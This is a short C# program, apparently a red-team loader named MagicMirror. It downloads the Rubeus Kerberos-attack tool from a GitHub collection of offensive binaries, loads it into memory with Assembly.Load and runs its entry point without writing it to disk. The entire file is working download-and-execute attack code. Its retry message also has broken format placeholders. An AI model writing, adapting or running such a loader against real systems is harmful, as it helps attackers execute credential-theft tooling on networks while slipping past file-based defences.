using System;
using System.Net;
using System.Reflection;
using System.Threading;

namespace MagicMirror
{
    internal class Program
    {
        static void MirrorFromWeb(string url, int retrycount, int timeoutTimer)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] programBytes = null;
           
            while (retrycount >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("[!]Item not found[!] Sleeping for (0) seconds amd trying another (1) time(s)...", timeoutTimer, retrycount);
                    retrycount--;
                    Thread.Sleep(timeoutTimer * 1000);
                }
            }
            if (programBytes == null)
            {
                Console.WriteLine("[!] Your item is in another castle :( Goodbye [!]");
                Environment.Exit(-1);
            }
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        static void Main(string[] args)
        {
            MirrorFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
        }
    }
}
